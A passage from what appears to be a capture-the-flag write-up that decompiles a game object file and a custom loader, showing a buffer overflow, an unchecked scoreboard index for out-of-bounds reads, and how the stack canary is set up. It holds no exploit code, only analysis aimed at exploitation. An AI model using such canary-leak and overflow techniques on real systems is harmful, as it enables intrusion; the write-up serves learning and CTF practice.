<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Suppose that the stack layout is like below, where:
</span></span><span style="display:flex;"><span>- 0x7fffffffdb10 = address of our input
</span></span><span style="display:flex;"><span>- 0x7fffffffdb38 = our canary value
</span></span><span style="display:flex;"><span>0x7fffffffdb10:	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x7fffffffdb20:	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>0x7fffffffdb30:	0x0000000000000000	0xdfe0586beeff1337
</span></span><span style="display:flex;"><span>0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>If we overflow our input until 0x7fffffffdb37,
</span></span><span style="display:flex;"><span>because of the LOC &#34;local_20 = local_20 &amp; 0xffffffffffffff;&#34;
</span></span><span style="display:flex;"><span>the stack will be like below:
</span></span><span style="display:flex;"><span>0x7fffffffdb10:	0x6161616161616161	0x6161616161616161
</span></span><span style="display:flex;"><span>0x7fffffffdb20:	0x6161616161616161	0x0061616161616161
</span></span><span style="display:flex;"><span>0x7fffffffdb30:	0x6161616161616161	0xdfe0586beeff1337
</span></span><span style="display:flex;"><span>0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>And when the strcpy got called, it won&#39;t copy our name together with the canary,
</span></span><span style="display:flex;"><span>because the null terminator is found in 0x7fffffffdb2f
</span></span></code></pre></td></tr></table>
</div>
</div><p>So let&rsquo;s dive further into the code to find a way to leak the <code>canary</code> value. Let&rsquo;s check another method defined in this object file, especially on the third menu function, which allows us to see the score in the <code>scoreboard[inputted_offset]</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">see_scoreboard</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> cVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> lVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  undefined local_58 [<span style="color:#f60">32</span>];
</span></span><span style="display:flex;"><span>  undefined8 local_38;
</span></span><span style="display:flex;"><span>  undefined8 local_30;
</span></span><span style="display:flex;"><span>  undefined8 local_28;
</span></span><span style="display:flex;"><span>  undefined8 local_20;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Which place</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">s score do you want to see (0-9)?&#34;</span>);
</span></span><span style="display:flex;"><span>  cVar1 <span style="color:#555">=</span> readline(local_58,<span style="color:#f60">0x20</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (cVar1 <span style="color:#555">==</span> <span style="color:#c30">&#39;\x01&#39;</span>) {
</span></span><span style="display:flex;"><span>    lVar2 <span style="color:#555">=</span> atou64(local_58);
</span></span><span style="display:flex;"><span>    print(<span style="color:#c30">&#34;To get this place you need to beat this score: &#34;</span>);
</span></span><span style="display:flex;"><span>    local_38 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    local_28 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    local_20 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>    u64toa(<span style="color:#555">&amp;</span>local_38,game_scoreboard[lVar2]);
</span></span><span style="display:flex;"><span>    puts((<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)<span style="color:#555">&amp;</span>local_38);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    __stack_chk_fail();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that we found our second bug, where we can do out-of-bounds (OOB) read on the scoreboard array. There isn&rsquo;t any bound checking when accessing the <code>game_scoreboard</code> array, which means we can leak any value even though it is placed outside the array. So with this bug, hopefully, we can leak useful value later. Keep in mind that our goal is to leak the <code>canary</code> value.</p>
<h4 id="decompilation-of-loader">Decompilation of loader <a href="#decompilation-of-loader" class="anchor">#</a></h4>
<p>Now we have understood the <code>game.o</code> object file, we still haven&rsquo;t found a way to leak the canary value, so that we can use the buffer overflow bug. Remember the challenge desc:</p>
<blockquote>
<p>I wasn&rsquo;t happy with the default ASLR, so I fixed it.</p>
</blockquote>
<p>Reading through it, it seems like this binary is implementing its own <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="noopener">ASLR</a>. In case you didn&rsquo;t know ASLR, it is a common mitigation technique to make it harder for an attacker to exploit a binary, by setting a random address for the binary function address, stack address, heap, including the used libraries also, so that it will be harder for the attacker to predict the address of each property during crafting their exploit because each new run will have different addresses.</p>
<p>We can deduce that maybe <code>loader</code> file is the one that has the implementation of the custom ASLR as it is the main binary. Let&rsquo;s check how the <code>loader</code> binary works by decompiling it one by one.</p>
<p>Let&rsquo;s start by decompiling the <code>_start</code> method, which is the first entry of the loader.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">_start</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined8 uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_14;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_10;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  sys_getrandom(<span style="color:#555">&amp;</span>rand_state,<span style="color:#f60">8</span>,<span style="color:#f60">2</span>);
</span></span><span style="display:flex;"><span>  init_stack_guard();
</span></span><span style="display:flex;"><span>  local_c <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(files <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_c <span style="color:#555">*</span> <span style="color:#f60">8</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    load_o_phase_1(o_ctx <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_c <span style="color:#555">*</span> <span style="color:#f60">0x268</span>,<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(files <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_c <span style="color:#555">*</span> <span style="color:#f60">8</span>));
</span></span><span style="display:flex;"><span>    local_c <span style="color:#555">=</span> local_c <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(files <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_10 <span style="color:#555">*</span> <span style="color:#f60">8</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    load_o_phase_2(o_ctx <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_10 <span style="color:#555">*</span> <span style="color:#f60">0x268</span>,<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(files <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_10 <span style="color:#555">*</span> <span style="color:#f60">8</span>));
</span></span><span style="display:flex;"><span>    local_10 <span style="color:#555">=</span> local_10 <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  local_14 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(files <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_14 <span style="color:#555">*</span> <span style="color:#f60">8</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    load_o_phase_final(o_ctx <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_14 <span style="color:#555">*</span> <span style="color:#f60">0x268</span>,<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(files <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_14 <span style="color:#555">*</span> <span style="color:#f60">8</span>));
</span></span><span style="display:flex;"><span>    local_14 <span style="color:#555">=</span> local_14 <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#555">=</span> export_get(<span style="color:#555">&amp;</span>DAT_004031d0);
</span></span><span style="display:flex;"><span>  zeromem(o_info,<span style="color:#f60">0x200</span>);
</span></span><span style="display:flex;"><span>  zeromem(o_ctx,<span style="color:#f60">0x9a00</span>);
</span></span><span style="display:flex;"><span>  zeromem(export_info,<span style="color:#f60">0xa00</span>);
</span></span><span style="display:flex;"><span>  export_count <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  rand_state <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  pivot_to_main(uVar1);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>After reading through the decompiled codes, seems like this <code>loader</code> will:</p>
<ul>
<li>Initialize random state</li>
<li>Initialize canary stack value</li>
<li>Load the given object files to the loader</li>
<li>Run the main program</li>
</ul>
<p>Let&rsquo;s try to go through it step by step.</p>
<h5 id="initialize-random-state">Initialize Random State <a href="#initialize-random-state" class="anchor">#</a></h5>
<p>In this step, the <code>loader</code> will initialize its random state before running the <code>game</code> object file. Let&rsquo;s check the LOC of this step:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>sys_getrandom(<span style="color:#555">&amp;</span>rand_state,<span style="color:#f60">8</span>,<span style="color:#f60">2</span>);
</span></span></code></pre></td></tr></table>
</div>
</div><p>So <code>loader</code> will call <code>sys_getrandom</code>. Let&rsquo;s check it out.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">sys_getrandom</span>(undefined8 param_1,undefined8 param_2,undefined4 param_3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  syscall3(<span style="color:#f60">0x13e</span>,param_1,param_2,param_3);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Oh okay, so turn out, this will call <code>getrandom</code> syscall, and initialize a global variable called <code>rand_state</code> with 8 random bytes.</p>
<h5 id="initialize-canary-stack-value">Initialize canary stack value <a href="#initialize-canary-stack-value" class="anchor">#</a></h5>
<p>Let&rsquo;s move to the next LOC</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>init_stack_guard();
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s check the method decompiled result.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">init_stack_guard</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined8 uVar2;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uVar2 <span style="color:#555">=</span> sys_mmap(<span style="color:#f60">0</span>,<span style="color:#f60">0x1000</span>,<span style="color:#f60">3</span>,<span style="color:#f60">0x22</span>,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>  syscall2(<span style="color:#f60">0x9e</span>,<span style="color:#f60">0x1002</span>,uVar2);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#555">=</span> rand();
</span></span><span style="display:flex;"><span>  write_stack_guard(iVar1);
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
